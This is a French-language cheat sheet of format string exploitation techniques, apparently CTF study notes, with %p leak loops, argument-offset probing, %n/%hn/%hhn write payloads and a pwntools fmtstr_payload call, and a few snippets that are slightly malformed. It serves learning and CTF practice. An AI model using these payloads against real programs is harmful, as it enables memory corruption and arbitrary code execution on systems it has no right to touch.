# Documentation 

- https://docs.pwntools.com/en/stable/fmtstr.html
- https://corgi.rip/blog/format-string-exploitation/
- https://axcheron.github.io/exploit-101-format-strings/
- https://osandamalith.com/2018/02/01/exploiting-format-strings-in-windows/
- https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html


## Lire en mémoire  (%x, %p)


```python 
print('%p-'*200)
```

```python
# leak = resultat
leak = ""
out = b""
for p in leak.split("-"):
    if not p.startswith("0x"):
        continue
    h = p[2:].zfill(16)             # 8 bytes
    out += bytes.fromhex(h)[::-1]   # little endian

print(bytes(c for c in out if 32 <= c <= 126).decode())
```

### Offset des arguments (%N$x)

- [calling_conventions](https://github.com/4nuit/Hacking/tree/master/pwn/stack#calling-conventions)
- https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak


```c
// affiche les 5 premiers arguments
printf('%4$x');
// equivalent
printf('%x%x%x%x');
```

```bash
echo -ne 'AAAA%4$p' | ./fmt
#AAAA0x41414141
```

#### Ciblage (%s)

```c
// fuite du 5 (4+1) ème argument
printf('%4$s')
```

### Lire une addresse (%s)

```c
// argument | addresse
// 4        | 0x55552324
printf('%4sAAAA\x43\x23\x55\x55')
```


## Ecrire en mémoire  (%Nx, %n)

- [HTB - CyberApocalypse - Pwn Delulu](https://github.com/4nuit/Writeup/tree/master/2024/HTB_CyberApocalypse/pwn/pwn_delulu)
- [Patriot CTF - GOT Overwrite](https://github.com/4nuit/Writeup/tree/master/2023/Patriot/pwn/printshop)
- https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/got-overwrite
- https://www.ctfrecipes.com/pwn/protections/stack-canaries#bypassing-canaries

```py

payload = fmtstr_payload(4, {0x55552324: 0x12345678, numbwritten=0)
```

### Padding (%Nx: stack buffer overflow)

```bash
%x
//arg1

%400x
//padding
//                  arg1

%400d
//padding, size of integer
```

### Ecrire une valeur (%n)


```c
// argument | addresse  | valeur à écrire
// 4        | 0x55552324| sizeof(addr) + 6 (=10)
printf('\x43\x23\x55\x55%6c%4$n')
```

### Ecrire une addresse (%hn)

- %n écrit sur 4 bytes-> adresse énorme en hexa 
- on écrit par groupe de 2 bytes avec %hn
- possible d'écrire byte par byte avec %hhn

```bash
rax2 0xbeef
48879
```

```c
printf('%48879d%7$hn')
```

### Call free / malloc

```c
// prints 2**16-1 elements
printf('%100000x')
```

### Exploit

0xdeadbeef = 0xdead (high) "+" 0xbeef (low)

- `%[hexa à écrire]x%[n contrôlé]$n`
- `[endian(adresse écriture low) + endian(addresse écriture high = low +2)]%[hexa low à écrire - 8]x%[n contrôlé]$hn%[hexa abs((low-8)-(high-8)) à écrire]x%[n+1] $hn"')`


**ou** en 4 avec %hhn ...
